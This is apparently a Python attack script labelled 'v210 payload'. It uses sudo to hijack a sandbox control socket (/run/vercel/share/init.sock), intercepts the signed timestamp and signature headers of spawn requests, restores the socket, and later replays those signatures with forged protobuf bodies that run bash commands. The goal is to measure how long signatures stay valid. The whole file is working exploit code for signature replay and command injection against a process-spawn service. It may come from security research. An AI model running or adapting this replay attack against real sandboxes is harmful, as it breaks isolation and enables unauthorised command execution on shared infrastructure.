# -*- coding: utf-8 -*-
"""v210 payload: 同沙箱延迟重放 - 测签名新鲜度窗口
1. hook 捕获 2 个请求的 (ts, sig)
2. 恢复 socket
3. 捕获后 60s 重放 req1 (写 /tmp/v210_60)
4. 捕获后 120s 重放 req2 (写 /tmp/v210_120)
5. 检查文件 -> 判定窗口"""
import socket, time, os, subprocess, signal

signal.alarm(300)
SOCKPATH = '/run/vercel/share/init.sock'
BAK = SOCKPATH + '.bak'
LOG = '/vercel/sandbox/v210.log'
f = open(LOG, 'w', encoding='utf-8', errors='replace')
PATH = '/vercel.sandbox.spawn.v1.SpawnService/Spawn'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\n')
    f.flush()
    print(line, flush=True)


def recv_more(conn, timeout):
    try:
        conn.settimeout(timeout)
        return conn.recv(65536)
    except Exception:
        return b''


def read_http(conn, timeout=8):
    conn.settimeout(timeout)
    d = b''
    while b'\r\n\r\n' not in d:
        x = recv_more(conn, timeout)
        if not x:
            break
        d += x
        if len(d) > 300000:
            break
    if b'\r\n\r\n' not in d:
        return d
    head, _, rest = d.partition(b'\r\n\r\n')
    try:
        cl = 0
        for ln in head.split(b'\r\n')[1:]:
            if ln.lower().startswith(b'content-length:'):
                cl = int(ln.split(b':', 1)[1].strip())
        while len(rest) < cl:
            x = recv_more(conn, timeout)
            if not x:
                break
            rest += x
    except Exception:
        pass
    return head + b'\r\n\r\n' + rest[:cl]


def varint(n):
    out = b''
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def proto_str(field, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([field << 3 | 2]) + varint(len(b)) + b


def build_body(command, args, cwd='/vercel/sandbox'):
    proto = proto_str(1, command)
    for a in args:
        proto += proto_str(2, a)
    proto += proto_str(4, cwd)
    return b'\x00\x00\x00\x00' + bytes([len(proto)]) + proto


def build_req(ts, sig, body):
    h = ('POST %s HTTP/1.1\r\nHost: localhost\r\nUser-Agent: connect-go/1.20.0 (go1.25.14)\r\n' % PATH).encode()
    h += b'Content-Length: %d\r\nAccept-Encoding: identity\r\nConnect-Accept-Encoding: gzip\r\n' % len(body)
    h += b'Connect-Protocol-Version: 1\r\nContent-Type: application/connect+proto\r\n'
    h += b'X-Signature: %s\r\nX-Timestamp: %s\r\n\r\n' % (sig.encode(), ts.encode())
    return h + body


def punix(req, t=6):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(t)
    s.connect(SOCKPATH)
    s.sendall(req)
    d = b''
    try:
        while True:
            x = s.recv(65536)
            if not x:
                break
            d += x
            if len(d) > 8000:
                break
    except Exception:
        pass
    s.close()
    return d[:4000]


captured = []

log('=== hook start ===')
r = subprocess.run(['sudo', '-n', 'mv', SOCKPATH, BAK], capture_output=True, timeout=5)
log('MV rc=%d' % r.returncode)
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(SOCKPATH)
srv.listen(16)
srv.settimeout(1)
log('HOOK LISTENING')

hook_end = time.time() + 40
while time.time() < hook_end and len(captured) < 2:
    try:
        c, _ = srv.accept()
    except socket.timeout:
        continue
    except Exception as e:
        log('ACCEPT EXC %s' % e)
        break
    req = read_http(c, 6)
    head = req.split(b'\r\n\r\n', 1)[0]
    hdrs = {}
    for ln in head.split(b'\r\n')[1:]:
        if b':' in ln:
            k, v = ln.split(b':', 1)
            hdrs[k.strip().lower()] = v.strip()
    ts = hdrs.get(b'x-timestamp', b'').decode(errors='replace')
    sig = hdrs.get(b'x-signature', b'').decode(errors='replace')
    if ts and sig:
        captured.append((ts, sig))
        log('CAPTURED %d ts=%s siglen=%d' % (len(captured), ts, len(sig)))
    c.close()

srv.close()
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
r = subprocess.run(['sudo', '-n', 'mv', BAK, SOCKPATH], capture_output=True, timeout=5)
log('RESTORE rc=%d captured=%d' % (r.returncode, len(captured)))

if len(captured) >= 1:
    ts, sig = captured[0]
    log('sleep 60s before replay1...')
    time.sleep(60)
    body = build_body('bash', ['-c', 'echo V210-60-OK > /tmp/v210_60 && id >> /tmp/v210_60'])
    rp = punix(build_req(ts, sig, body))
    log('REPLAY1@60s -> %r' % rp[:300])

if len(captured) >= 2:
    ts, sig = captured[1]
    log('sleep 60s before replay2 (120s total)...')
    time.sleep(60)
    body = build_body('bash', ['-c', 'echo V210-120-OK > /tmp/v210_120 && id >> /tmp/v210_120'])
    rp = punix(build_req(ts, sig, body))
    log('REPLAY2@120s -> %r' % rp[:300])

for fn in ['/tmp/v210_60', '/tmp/v210_120']:
    try:
        if os.path.exists(fn):
            log('FILE %s EXISTS: %r' % (fn, open(fn).read()))
        else:
            log('FILE %s MISSING' % fn)
    except Exception as e:
        log('FILE %s EXC %s' % (fn, e))
log('V210_DONE')
f.close()
